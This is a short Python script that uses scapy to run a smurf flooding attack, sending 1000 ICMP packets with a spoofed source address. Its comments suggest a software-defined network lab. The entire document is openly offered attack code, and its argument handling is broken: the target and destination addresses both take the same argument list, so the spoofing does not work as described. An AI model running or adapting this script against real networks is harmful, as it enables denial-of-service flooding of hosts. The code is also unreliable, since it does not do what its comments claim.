#run on host's xterm terminal "python -E smurf.py broadcast_address target_IP"
"""
smurf flooding attack to target host IP address with IP-spoofing.
This attack might not harmful to controller, switch, but host within the network.
send 1000 packets with the rate of 40 packes per second
"""
#!/usr/bin/env python
import sys
import time
from os import popen
from scapy.all import sendp, IP, Ether, ICMP
from random import randrange

def main():
    # getting the ip address to send attack packets
    targetIP = sys.argv[1:]
    dstIP= sys.argv[1:]
    # open interface eth0 to send packets
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    #print (repr(interface))
    for i in xrange(0, 1000):
        # form the packet
        packets = Ether()/IP(dst=dstIP, src=targetIP)/ICMP()
        print(repr(packets))
        # send packet with the defined interval (seconds)
        sendp(packets, iface=interface.rstrip(), inter=0.05)
    # main

if __name__ == "__main__":
    main()
